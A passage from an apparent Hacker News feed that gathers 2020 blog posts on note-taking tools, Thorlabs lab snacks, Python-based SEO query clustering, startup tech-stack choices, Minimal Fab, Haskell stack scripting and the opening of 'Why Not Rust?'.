<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-33de0799eab39cfadbe1"><div><p>I’ve never been a huge online note taker. From high school to university, I’ve always relied on pen and paper as my weapon of choice. At the time and even to some extent now, I’ve felt like this was a good enough solution to my problems.</p><p>I’ve always felt the simpler the solution the better. Why complicate things?</p><p>This changed however after working as a software engineer in industry. As I worked on a software product that derived its core functionality from machine learning, it seemed that I was constantly drowning in a sea of information.&nbsp;</p><p>It was a constant repetition of learning something, forgetting about it 5 months later and then having to recycle through my notes and reread the article/paper/blog.</p><p>My brain was a leaky bucket. Every time I poured something in, something else would leak out.</p><p>It was during those dark times of desperation that I stumbled upon the “niche” industry of Knowledge Management Systems (KMS) and as an extension, the Memex.</p><p> I was fascinated with all the innovation coming from up and coming open source projects and companies in this space. Software like Athens (https://github.com/athensresearch/athens), Roam (https://roamresearch.com/), Obsidian (https://obsidian.md/) all seemed so promising. </p><p>I was particularly inspired by reading karlicoss’s blog (https://beepb00p.xyz/promnesia.html). He outlines so many good and intuitive reasons why the current solutions are broken (although in this particular post he focuses on browser history).</p></div></div></div></div>]]>
            </description>
            <link>http://steveliu.co/memex</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540284</guid>
            <pubDate>Mon, 21 Sep 2020 06:01:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lab Snacks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24540166">thread link</a>) | @neilpanchal
<br/>
September 20, 2020 | https://neil.computer/notes/thorlabs-lab-snacks/ | <a href="https://web.archive.org/web/*/https://neil.computer/notes/thorlabs-lab-snacks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
        
        <p>Throughout my engineering career (Semiconductor industry), I've come across dozens if not hundreds of equipment suppliers. But there are a few suppliers that leave a long lasting impression. Thorlabs is one of them. Why?</p><p>It is quite silly actually. Everytime I order a linear actuator, motorized stage or axis controller... something that's just normal industrial hardware, it ships unremarkably with billable weight in hundreds of dollars, docks and sits at the shipping &amp; receiving until I haul it into the lab. Cut open the box, and you see this:</p><figure><img src="https://neil.computer/content/images/2020/09/image.png" alt=""><figcaption>Source: https://jlfenimore.wixsite.com/jenniferfenimore/lab-snacks</figcaption></figure><p>Food and Drink are not allowed in our lab, except when it comes to the Thorlabs Snacks. This little red box brings so much joy it is hard to describe. Thorlabs shipping boxes contain one or more of these red boxes, it's got - cookies, candies, granola bars, chips, etc. to put a smile on the face. They didn't have to do it but they did. And they've been doing this for many years. Infact, they've trademarked "Lab Snacks" which is such a cool name on its own!</p><p>Thorlabs founder, Alex Cable, wrote an <a href="https://www.thorlabs.com/about_us.cfm">article</a> about his vision of what customer centricity is, there is so much to learn from it, Wikipedia quotes:</p><blockquote>An important part of Thorlabs' brand and culture is Lab Snacks. Lab Snacks were created to support the famished grad student researching all night, serving as an occasional meal for someone hard at work.</blockquote><p>I implore you to read the original <a href="https://www.thorlabs.com/about_us.cfm">source</a> because it exemplifies what a CEO and Founder should do to build an honest, customer centric business and how to genuinely connect with them. Everything at Thorlabs, from their phone support to documentation, is focusing on how best to make you, the customer, successful. Therein lies their success and they double-down on it.</p><p>Thorlabs has left such a long-lasting impact on me that I am writing this post after last enjoying Lab Snacks 2 years ago.</p>
        </article>
</div></div>]]>
            </description>
            <link>https://neil.computer/notes/thorlabs-lab-snacks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540166</guid>
            <pubDate>Mon, 21 Sep 2020 05:38:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SEO Workflows with Machine Learning and Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540059">thread link</a>) | @shrikar
<br/>
September 20, 2020 | https://shrikar.com/python-for-seo-using-google-search-console/ | <a href="https://web.archive.org/web/*/https://shrikar.com/python-for-seo-using-google-search-console/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this post we will learn how to use python for improving the SEO of your site and understanding opportunities. We will start by exploring google search console data and finding topics that convert well and also topics which get impressions but doesn’t convert.</p><p>Lets start by looking at the google search console and export the performance data for our website.<br>
<a href="https://shrikar.com/wp-content/uploads/2020/09/search_console.png?x45224"><img src="https://shrikar.com/wp-content/uploads/2020/09/search_console-1024x198.png?x45224" alt="search_console" width="810" height="157"></a></p><p>Next upload the Queries file exported from google search console data to Google Drive.<br>
<a href="https://shrikar.com/wp-content/uploads/2020/09/drive.png?x45224"><img src="https://shrikar.com/wp-content/uploads/2020/09/drive-1024x374.png?x45224" alt="drive" width="810" height="296"></a></p><p>Next we will start looking at the queries and building topic clusters which will help us figure out the next course of action ( Note for this case we will not use LDA). We will use a simple TfidfVectorizer to convert the text into vector format and run KMeans Clustering Algorithm on the vectorized form of the search queries to generate clusters</p><pre>import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import KMeans
from sklearn.metrics import adjusted_rand_score
from google.colab import drive

# Mount the drive.
drive.mount('/content/drive')

# Read the performance data into Pandas data frame.

df = pd.read_csv("/content/drive/My Drive/ColabData SearchConsole/Queries.csv")

documents = list(df.Query.values)
vectorizer = TfidfVectorizer(stop_words='english', ngram_range=(1,3))
X = vectorizer.fit_transform(documents)

true_k = 20
model = KMeans(n_clusters=true_k, init='k-means++', max_iter=1000, n_init=42, random_state=42)
model.fit(X)

print("Top terms per cluster:")
order_centroids = model.cluster_centers_.argsort()[:, ::-1]
terms = vectorizer.get_feature_names()
for i in range(true_k):
    
    cluster_terms = []
    for ind in order_centroids[i, :10]:
        cluster_terms.append(' %s' % terms[ind])        
    print("Cluster {}, Terms : {}".format(i, cluster_terms)),

Top terms per cluster:
Cluster 0, Terms : [' classification', ' multiclass', ' keras', ' multiclass classification', ' classification keras', ' lstm', ' multiclass classification keras', ' keras classification', ' keras multiclass', ' text classification']
Cluster 1, Terms : [' uiactivityviewcontroller', ' uiactivityviewcontroller swift', ' uiactivityviewcontroller share', ' share', ' swift', ' uiactivityviewcontroller ipad', ' ipad', ' url', ' swift uiactivityviewcontroller', ' uiactivityviewcontroller delegate']
Cluster 2, Terms : [' ios', ' xcode', ' ios swift', ' charts', ' swift', ' charts ios', ' tutorial', ' ios charts', ' s3', ' app']
Cluster 3, Terms : [' inventory', ' iphone', ' inventory app', ' app', ' app iphone', ' inventory app iphone', ' barcode', ' ios inventory', ' management', ' inventory management']
Cluster 4, Terms : [' multi class', ' class', ' multi', ' class classification', ' multi class classification', ' classification', ' keras', ' keras multi class', ' python', ' classification keras']
Cluster 5, Terms : [' uitableview', ' delegate', ' swift', ' delegate swift', ' uitableview delegate', ' datasource', ' grouped', ' delegate datasource', ' swift uitableview', ' uitableview tutorial']
Cluster 6, Terms : [' make', ' like', ' uber', ' app', ' like app', ' uber like app', ' uber like', ' make app', ' like uber', ' make uber']
Cluster 7, Terms : [' swift', ' share', ' share swift', ' swift share', ' charts', ' uipageviewcontroller', ' charts swift', ' uipageviewcontroller swift', ' coredata', ' chart']
Cluster 8, Terms : [' tutorial', ' apple', ' pay', ' apple pay', ' swift', ' swift tutorial', ' xcode', ' serverless', ' aws', ' app tutorial']
Cluster 9, Terms : [' uisearchbar', ' uisearchbar swift', ' swift', ' swift uisearchbar', ' uisearchbar example', ' uisearchbar delegate', ' ios uisearchbar', ' uisearchbar ios', ' uisearchbar tutorial', ' example']
Cluster 10, Terms : [' uitableviewcell', ' uitableviewcell swift', ' init', ' custom', ' uitableviewcell init', ' swift uitableviewcell', ' swift', ' uitableview uitableviewcell', ' custom uitableviewcell', ' uitableviewcell custom']
Cluster 11, Terms : [' counter', ' step', ' step counter', ' counter app', ' iphone', ' step counter app', ' app', ' counter iphone', ' iphone step counter', ' iphone step']
Cluster 12, Terms : [' core', ' core data', ' data', ' data swift', ' core data swift', ' swift', ' core data tutorial', ' data tutorial', ' swift core', ' tutorial']
Cluster 13, Terms : [' uber', ' uber app', ' app', ' build uber', ' build uber app', ' build', ' tutorial', ' iphone', ' create uber', ' create uber app']
Cluster 14, Terms : [' pedometer', ' iphone', ' pedometer app', ' iphone pedometer', ' pedometer iphone', ' app', ' pedometer app iphone', ' app iphone', ' pedometer swift', ' swift pedometer']
Cluster 15, Terms : [' tableview', ' tableview delegate', ' tableview datasource', ' delegate', ' swift tableview', ' datasource', ' swift', ' methods', ' grouped', ' grouped tableview']
Cluster 16, Terms : [' search', ' bar', ' search bar', ' swift search', ' swift', ' bar swift', ' search bar swift', ' swift search bar', ' search bar ios', ' bar ios']
Cluster 17, Terms : [' example', ' word2vec', ' sagemaker', ' serverless', ' framework', ' cloudkit', ' python', ' uivisualeffectview', ' serverless framework', ' view']
Cluster 18, Terms : [' uialertcontroller', ' uialertcontroller swift', ' uialertcontroller image', ' image', ' swift uialertcontroller', ' ios uialertcontroller', ' uialertcontroller ios', ' uialertcontroller example', ' swift', ' ios']
Cluster 19, Terms : [' lsa', ' gensim', ' vs', ' gensim lsa', ' lsa vs', ' word2vec', ' lda', ' lsa python', ' lsa word2vec', ' lsa gensim']

</pre><p>Google Search Console allows us to download around 1000 keywords and with the above method we have been able to cluster similar search queries together. Now it’ss time to map the clusters to well defined topics.</p><p>Next we will assign a topic label to each cluster by looking at the terms which the Clustering Algorithm has provided us. Here are the manually assigned topics.</p><pre>topic_map = {
    0: 'Multi Class Classification',
    1: 'iOS Sharing (How To)',
    2: 'iOS Charts',
    3: 'iOS BarCode and Inventory Management',
    4: 'Multi Class Classification',
    5: 'iOS UI TableViews',
    6: 'How to make an app series',
    7: 'Core Data &amp; Swift',
    8: 'Apple Pay',
    9: 'Implement Search in iOS',
    10: 'UITableViews &amp; Layouts',
    11: 'iOS HealthKit',
    12: 'Core Data',
    13: 'Build by example: Uber',
    14: 'iOS Step Counter App',
    15: 'iOS UI TableViews',
    16: 'Swift Search Bar',
    17: 'AWS Serverless',
    18: 'Notifications / Alerts Swift',
    19: 'Word Vectors'    
}
</pre><p>Next we will use the model to predict the cluster label to each of the search query we got from the google search console data.</p><pre># This will generate labels from 0 to 19 and we will use the map above to map it to readable cluster labels

df['cluster'] = model.predict(vectorizer.transform(df.Query))

df['cluster_label'] = df.cluster.map(topic_map)

# Next create the ctr from Click and impression data
df['ctr'] = df.Clicks/df.Impressions

# Find the topic cluster on your site which are converting the best and also the topic which get impression but doesn't convert well.
df['ctr'] = df.Clicks/df.Impressions
df.groupby('cluster_label')[['ctr', 'Impressions']].mean().reset_index().sort_values('ctr', ascending=False)

</pre><p><a href="https://shrikar.com/wp-content/uploads/2020/09/cluster_labels1.png?x45224"><img src="https://shrikar.com/wp-content/uploads/2020/09/cluster_labels1-1024x675.png?x45224" alt="cluster_labels" width="810" height="534"></a></p><h2>How to use this data</h2><p>The clusters with low ctr data but high impression data is the opportunity zone and you can either build new posts of improve the existing page to make it more useful. Start with updating meta description aka the snippet that the google show for you link.</p><ul><li>Add more topic pages and improve the existing ones.</li><li>Find related keywords for these topic clusters and add new pages</li><li>Linking to these new pages from existing high traffic pages.</li><li>Once we start building more content and improving&nbsp; existing pages&nbsp;we can use the model built above to see how the CTR of the topic improve over time by automating the google search console data and the clustering method described above.</li></ul><p>I am not a SEO pro please provide any feedback and if you are interested in collaborating on a areas related to SEO and Machine Learning feel free to ping me.</p></div></div>]]>
            </description>
            <link>https://shrikar.com/python-for-seo-using-google-search-console/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540059</guid>
            <pubDate>Mon, 21 Sep 2020 05:17:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Choosing the right tech stack for your product]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540001">thread link</a>) | @root993
<br/>
September 20, 2020 | https://www.sankalpjonna.com/posts/choosing-the-right-tech-stack-for-your-product | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/choosing-the-right-tech-stack-for-your-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It is always difficult to choose a tech stack for your application. Especially one that is going to be worked on by many people in the future. The fact that technologies like Javascript change almost on a daily basis and new frameworks come up every time I browse the internet does not make this job any easier.<br></p><p>On one hand you want to be using the latest technologies available but on the other hand you can’t afford to have a high learning curve or use something that is not a 100% stable yet because you are most likely going to build a long term business that must stand the test of time.<br></p><p>In many ways it is similar to choosing a person to date. You wanna go with the best looking one but you also need the person to have some depth so that you can have a long term relationship!<br></p><p>So how do you choose the right tech stack? I can’t say for sure that the methods that am employing are the best ones and readers can always reach out to me on twitter and correct me but here are some of the things that I am keeping in mind right now<br></p><h3><strong>Prioritising speed over “doing the right thing”</strong><br></h3><p>It is important for a startup to move fast. If I spend time learning new technologies and understanding all the nuances of those technologies it might take a long time to actually build a product and get it out the door. <br></p><p>For instance, I am currently building a <a href="https://www.delight.chat/" target="_blank">customer support software for e-commerce businesses</a> and I have been advised by a few folks that my use case would involve dealing with a lot of unstructured data so MongoDB is the right database to use. <br></p><p>The issue here is that I do not have much experience with nosql and I have personally never used it in production. So even if this is the right thing, it might end up causing me a lot of grief down the line when I am not able to debug certain issues just because I don’t have a deeper understanding of the subject. <br></p><p>I decided to go with Postgres instead because while being a relational database which I am comfortable with, Postgres supports a datatype called JSONB where you can store unstructured data much like in Mongo. This seemed like the optimal thing to do.<br></p><h3><strong>Other people will be working on your codebase</strong><br></h3><p>I my previous venture, I wrote some services in Golang. I did this because I enjoy writing code in Go, not to mention that it is a compiled language with syntax that is easy to understand and yields performance that is close to C/C++.<br></p><p>This seemed like a good idea at the time because the services I wrote in Go were highly scalable and I did not have to touch them again for a long time. The issue came up when we exited the business and I had to transfer the codebase to folks who never worked in Golang. <br></p><p>The same thing could happen when you hire new folks who might have great aptitude for the role but do not necessarily know all the nuances of working with a brand new language. This is going to delay development time significantly.<br></p><h3><strong>Do not spend time on solved problems </strong><br></h3><p>The amount of work required to build your core product is already quite high, you don’t want to be making it worse by spending valuable development hours on building things that are not core to your product.<br></p><p>For our current product we needed a socket infrastructure so that the server can push real time updates to the browser when a certain event takes place. At first I thought of using something like <a href="http://socket.io/" target="_blank">socket.io</a> but after giving it some further thought, I realised that it would take up considerable bandwidth to maintain the socket service as the product scales in usage.<br></p><p>We decided to cough up some $$ and go with <a href="http://pusher.com/" target="_blank">pusher.com</a> instead. They are a SaaS that offer socket infrastructure as a service. If their entire business depends on one particular pain point, it is safe to assume that they would have done the best possible job of handling it and would have found out all the edge cases and bugs that might come up. <br></p><h3><strong>Break up the product into microservices</strong><br></h3><p>For a monolithic codebase there is pretty much no choice but to work on the same language and frameworks for the foreseeable future. This means that not only are you stuck with a tech stack that you choose a long time ago, but even the folks you hire in the future will be stuck working on the same thing as well.<br></p><p>To prevent this, it is important to segregate your product into micro services that can be developed, maintained and deployed independently so that you can easily swap some of these services with new ones written in a new language or framework without affecting the working of the rest of the product.<br></p><h3><strong>Closing notes</strong><br></h3><p>While speed is important, it is also important to make sure that your employees are comfortable with the tech stack and do not feel like their careers are being jeopardised due to not being able to work on the latest technologies and frameworks that are available in the market. It would not be fair for me to say that we will only use PHP and nothing else and whoever joins us must suck it up and work on it. <br></p><p>It could also negatively impact us if we miss out on the ease of problem solving that new technologies and frameworks provide. So there must always be balance &nbsp;between speed and upgrading yourself to something new and better. <br></p><p>So if you find yourself in a position where there is a new technology that can make things significantly better but it would require a learning curve and a considerable risk of not being able to find employees who can work on this technology very easily, it might still be worth to go for it.</p><p>‍</p></div></div>]]>
            </description>
            <link>https://www.sankalpjonna.com/posts/choosing-the-right-tech-stack-for-your-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540001</guid>
            <pubDate>Mon, 21 Sep 2020 05:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Minimal Fab]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539997">thread link</a>) | @mleonhard
<br/>
September 20, 2020 | https://www.minimalfab.com/en/about/greeting.php | <a href="https://web.archive.org/web/*/https://www.minimalfab.com/en/about/greeting.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap_type01">
	<div>
		<figure><img src="https://www.minimalfab.com/en/about/img/img_greeting01.jpg" alt="Naoto Kobayashi, Representative Director"></figure>
		<p>Nowadays, industries are greatly changing their properties due to rapid development of IoT (Internet of Things), Big Data and AI (Artificial Intelligence). That is also called “4th Industrial Revolution”. In these circumstances, semiconductors are increasingly used in a large number of devices for information and communication, memory, optical and wireless components, sensors, actuators, etc., and their application field is becoming far wider such as health and medical, automobiles and transportation, environments and energy, education, etc.</p>
	</div>
	<p>Large semiconductor production facilities (Mega Fab) usually require billions of dollars in investment and, therefore, the manufacturing is limited to a few large companies in the world. On the other hand, Minimal Fab is a different method of semiconductor production and it requires extremely smaller investment than for Mega Fab. Moreover, Minimal Fab can provide flexible methods of manufacturing and is especially suitable for high-mix low-volume semiconductor production. This is also suitable for new IoT applications in the 4th Industrial Revolution world.</p>
	<p>The idea of Minimal Fab was first produced in AIST (National Institute of Advanced Industrial Science and Technology) and it was then developed to practical use by a consortium of AIST and 22 companies in Japan. The consortium has been recently evolved to Minimal Fab Promoting Organization.</p>
	<p>We are aiming to establish a completely new and flexible production system and to bring about a process revolution by Minimal Fab. Moreover, we would like to widely expand the field of application of semiconductors by Minimal Fab. Our organization composed of more than 150 companies is going to promote and disseminating the Minimal Fab technology and its application. We are sincerely asking you a cooperation and support to the Minimal Fab.</p>
	<p>Naoto Kobayashi, Representative Director</p>
</div></div>]]>
            </description>
            <link>https://www.minimalfab.com/en/about/greeting.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539997</guid>
            <pubDate>Mon, 21 Sep 2020 05:06:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stack script: A guide to scripting in Haskell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539987">thread link</a>) | @wespiser_2018
<br/>
September 20, 2020 | https://www.wespiser.com/posts/2020-02-02-Command-Line-Haskell.html | <a href="https://web.archive.org/web/*/https://www.wespiser.com/posts/2020-02-02-Command-Line-Haskell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="content">
            
            <p>
    Posted on February  2, 2020
    
</p>

<h2 id="intro">Intro</h2>
<h4 id="why-stack-script">Why stack script ?</h4>
<p>If you share small, single module, self contained haskell examples, stack script gives us an easy way to get reproducible builds, by pinning the dependencies to a Stackage snapshot within a comment at the top of your Haskell code.<br>
There are at least two additional motivations, besides reproducible builds, that you might want to use Stack’s scripting feature:</p>
<ul>
<li><p>Lower the configuration barrier: write an independently compiling Haskell source code file with package dependencies without having to configure a new stack or cabal project. Personally, I find this helpful when exploring new libraries or writing small programs.</p></li>
<li><p>Using Haskell as a scripting language, or replacement for Shell/Bash/Zsh. This use case pairs well with the <code>Turtle</code> library, although this approach does have downsides.</p></li>
</ul>
<h4 id="about">About</h4>
<p>Stack is a build tool primarily designed for reproducible builds, done by specifying a resolver in a configuration file, usually your projects <code>stack.yaml</code> and <code>package.yaml</code> With Stack’s scripting feature, we still get reproducible builds by specifying a resolver, but move this specification to the file we are compiling, or as a command line argument. Therefore, for the sake of simplicity, we’ll assume that these scripts are run outside of a stack project, and stack is invoked in the same directory as the script file.<br>
<em>Note:</em> When running a stack script inside of a stack project, it’s important to consider that stack will read settings from your <code>project.yaml</code> and <code>stack.yaml</code>, which may cause issues.</p>
<h2 id="code-examples">Code Examples</h2>
<h4 id="outline">Outline</h4>
<p>This article contains the following examples of using scripting with stack:</p>
<ul>
<li>A basic example of the Scripting Interpreter</li>
<li>A simple Servant server that statically serves your current working directory</li>
<li>An example of stack as a bash replacement</li>
<li>Using stack script to launch ghci</li>
</ul>
<h4 id="basic-example-of-stack-script">Basic example of stack script</h4>
<p>For our first example, we’ll use stack to run a single file of Haskell source code as a script.</p>
<p>Here’s the source code we want to run, in a filed called <code>simple.hs</code>:</p>
<pre><code>main :: IO ()
main = putStrLn "compiled &amp; run"</code></pre>
<p>To run this with the stack script interpreter, we can do the following:</p>
<pre><code>$ stack script simple.hs --resolver lts-14.18</code></pre>
<p>The resolver argument is mandatory, and Stack will compile and run the <code>simple.hs</code> file immediately after invocation using the <code>lts-14.18</code> Stackage snapshot.<br>
Alternatively, we can put all of the configuration information into the script itself, like this:</p>
<pre><code>{- stack script 
 --resolver lts-14.18
-}
main :: IO ()
main = putStrLn "compiled &amp; run"</code></pre>
<p>which can be compiled and run with <code>$ stack simple.hs</code>.</p>
<h4 id="a-simple-servant-server">A simple Servant server</h4>
<p>The “killer feature” for scripting with stack is probably the ability to pull in packages without having to a <code>stack.yaml</code> or<br>
This can probably be best seen with <code>stack ghci</code>, where the following command will drop you into a ghci repl where you have <code>lens</code> and <code>text</code> packages available from the specificied resolver.</p>
<pre><code>stack ghci --package text --package lens --resolver lts-14.18</code></pre>
<p>An example of this concept with the stack scripting engine, is a quick and dirty file server, <code>explore.hs</code> would be as follows:</p>
<pre><code>~/projects/stack-script$ cat explore.hs
#!/usr/bin/env stack
{- stack script
 --resolver nightly-2019-12-22
 --install-ghc
 --package "servant-server warp"
 --ghc-options -Wall
-}
{-# LANGUAGE DataKinds, TypeOperators, TypeApplications #-}

module FileServer where

import Network.Wai.Handler.Warp( defaultSettings, runSettings, setBeforeMainLoop, setPort)
import Servant (Proxy(Proxy), Raw, serve, serveDirectoryWebApp)

main :: IO ()
main = runSettings settings . serve (Proxy @Raw) $ serveDirectoryWebApp "."
  where port = 8080
        msg = "serving on http://localhost:" ++ show port ++ "/{pathToFile}"
        settings = setPort port $ setBeforeMainLoop (putStrLn msg) defaultSettings</code></pre>
<p>Noting a couple of features</p>
<ul>
<li><code>--install-ghc</code> is the flag to install ghc, if it is not already available.</li>
<li>The addition of the hash bang, (line 1), <code>#!/usr/bin/env stack</code>, let’s you run this as an executable, <code>$ ./explore.hs</code></li>
<li>If running, this script will let you see it’s source code at <code>localhost:8080/static/explore.hs</code>, along with any other files within the current working directory the script was run.</li>
<li>The snapshot here is a nightly from the day the script was written, <a href="https://www.stackage.org/nightly-2019-12-22">nightly-2019-12-22</a>, which ensures the most up to date version of libraries are used when the script is written while still pinning us to a specific snapshot.</li>
<li>We pass in <code>-Wall</code> to ghc-options, and can give additional ghc options here.</li>
</ul>
<p>On a fresh compilation, this will take a few minutes to run, as Stack needs to go and grab about 255Mb worth of source code in ~86 dependent packages, compile and link it in order for the above code to run. However, on subsequent runs, Stack can use a local cache of of the packages, and we can reproduce our project build without downloading and building all the dependencies!</p>
<h4 id="stack-script-as-a-bash-replacement">Stack Script as a Bash Replacement</h4>
<p>It’s possible to use haskell, and Stack scripting feature, along with the Turtle library as a drop in replacement for shell scripting!<br>
To do this, we need the following at the top of our Haskell file:</p>
<pre><code>#!/usr/bin/env stack
{- stack script
 --compile
 --copy-bins
 --resolver lts-14.17
 --install-ghc
 --package "turtle text foldl async"
 --ghc-options=-Wall
-}</code></pre>
<p>This stack script does a couple of things:</p>
<ul>
<li><code>--compile</code> and <code>--copy-bins</code> create a binary executable based on the file name.<br>
</li>
<li>installs ghc, if needed with <code>install-ghc</code><br>
</li>
<li>builds the scripts with the set of packages from <code>lts-14.17</code></li>
</ul>
<p>With <a href="https://hackage.haskell.org/package/turtle">tutle</a>, we get a portable way to to run external shell commands, and I was able to create a nice haskell program to replace the shell script I used to automate the server tasks needed to deploy this blog!<br>
The basics my deploy turtle script are as follows, and you can see the <a href="https://gist.github.com/adamwespiser/25b0af28529a6de1272af6af6275f2a4#file-updatesite-hs">full example on github here</a></p>
<pre><code>import qualified Turtle as Tu
import qualified Control.Foldl as L
import qualified Data.Text as T
import Control.Concurrent.Async
import System.IO

argParser :: Tu.Parser Tu.FilePath
argParser = Tu.argPath "html" "html destination directory"

main :: IO ()
main = do
  -- 53 files copied over into destinationDir
  hSetBuffering stdout NoBuffering
  destinationDir &lt;- Tu.options "Build blog and copy to directory" argParser
  Tu.with (Tu.mktempdir "/tmp" "deploy") (mainLoop destinationDir)</code></pre>
<p>One nice thing about turtle is the <code>Tu.with</code> function, which lets use run our the main logic of our program with a temporary directory which is subsequently cleaned up after the <code>mainLoop</code> function returns.<br>
Despite turtle being a handy library, I did find some downsides - Use of <code>FilePath</code>, which uses a pretty clunky, <code>String</code> based file representation - Often times clunkier semantics than just writing bash: for instance, <code>cp -r SRC TRG</code> is requires a fold over the result of <code>ls SRC</code> and construction of an explicit <code>cp</code> with each file, instead, you need to use <code>cptree</code>, which took me a while to figure out, so it would be nice if the semantics matched better! - Turtle is a monolithic framework for interacting with OS through a set of mirrored shell commands trying to match <code>coreutiles</code>, and it’s tightly couple parts makes it not very easy to pick the parts you like, and disregard the rest!</p>
<h4 id="using-stack-script-to-run-ghci">Using stack script to run ghci</h4>
<p>We’ve already seen a few examples of stack script, but there is one more that should be in every Haskeller’s toolkit. Stack script can be used to launch a ghci repl. Let’s say we are working with a new ADT, and want to write a new QuickCheck instance, how can stack script help us?<br>
The following header will load the listed packages into a ghci repl:</p>
<pre><code>{- stack 
 --resolver nightly
 --install-ghc
 exec ghci
 --package "QuickCheck checkers"
-}
module XTest where</code></pre>
<p>There is one note to make here about the order of the arguments:</p>
<ul>
<li>The file will compile, then drop you into with module <code>XTest</code> is loaded</li>
<li>If <code>exec ghci</code> does not immediately follow <code>stack</code>, then the <code>--packages</code> must be before <code>exec ghci</code></li>
</ul>
<h5 id="ghcid">ghcid</h5>
<p>You can run the above stack script with <a href="https://github.com/ndmitchell/ghcid">ghcid</a> to get nearly instant compiler feedback using the following:</p>
<pre><code>bash$ ghcid -c "stack XTest.hs"</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>I often find myself coding up small Haskell snippets, whether it’s playing around with a new data type, trying out a library, or reproducing an example from a paper or a book. In these cases, Stack’ scripting feature shines at giving me a self contained file where I can specify the dependencies via a snapshot in the file header, and not have to worry about breaking changes, or setting up a project with all the correct dependencies. Thus, I would urge my fellow Haskellers to consider using stack’s scripting feature when they share code online, to help others run their code today, and keep that way far into the future!</p>
<h2 id="additional-information">Additional Information</h2>
<ul>
<li><a href="https://docs.haskellstack.org/en/stable/GUIDE/#script-interpreter">Stack Docs: Script Interpreter</a><br>
</li>
<li><a href="https://tech.fpcomplete.com/haskell/tutorial/stack-script">FPComplete: How to Script with Stack</a></li>
<li><a href="http://hackage.haskell.org/package/stack-1.9.3/docs/Stack-Script.html">Hackage: Stack.Script</a> Useful for figuring out what is going on underneath the hood!<br>
</li>
<li><a href="https://odone.io/posts/2019-07-08-scripting-in-haskell-and-purescript.html">Richard Odone: Scripting in Haskell and PureScript</a></li>
</ul>

        </div>
    </div></div>]]>
            </description>
            <link>https://www.wespiser.com/posts/2020-02-02-Command-Line-Haskell.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539987</guid>
            <pubDate>Mon, 21 Sep 2020 05:04:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Rust?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539955">thread link</a>) | @signa11
<br/>
September 20, 2020 | https://matklad.github.io//2020/09/20/why-not-rust.html | <a href="https://web.archive.org/web/*/https://matklad.github.io//2020/09/20/why-not-rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Sep 20, 2020</p>
  <p>I’ve recently read an article criticizing Rust, and, while it made a bunch of good points, I didn’t enjoy it — it was an easy to argue with piece.
In general, I feel that I can’t recommend an article criticizing Rust.
This is a shame — confronting drawbacks is important, and debunking low effort/miss informed attempts at critique sadly inoculates against actually good arguments.</p>
<p>So, here’s my attempt to argue <em>against</em> Rust:</p>
<div>
<dl>
<dt>Not All Programming is Systems Programming</dt>
<dd>
<div>
<div>
<p>Rust is a systems programming language.
It offers precise control over data layout and runtime behavior of the code, granting  you maximal performance and flexibility.
Unlike other systems programming languages, it also provides memory safety — buggy programs terminate in a well-defined manner, instead of unleashing (potentially security-sensitive) undefined behavior.</p>
<p>However, in many (most) cases, one doesn’t need ultimate performance or control over hardware resources.
For these situations, modern managed languages like Kotlin or Go offer decent speed, enviable
<a href="https://qconlondon.com/london-2017/system/files/presentation-slides/highperformancemanagedlanguages.pdf">time to performance</a>, and are memory safe by virtue of using a garbage collector for dynamic memory management.</p>
</div>
</div>
</dd>
<dt>Complexity</dt>
<dd>
<div>
<div>
<p>Programmer’s time is valuable, and, if you pick Rust, expect to spend some of it on learning the ropes.
Rust community poured a lot of time into creating high-quality teaching materials, but the Rust language <em>is</em> big.
Even if a Rust implementation would provide value for you, you might not have resources to invest into growing the language expertise.</p>
<p>Rust’s price for improved control is the curse of choice:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Bar</span>         <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Bar</span>     <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>Bar</span> <span>}</span>
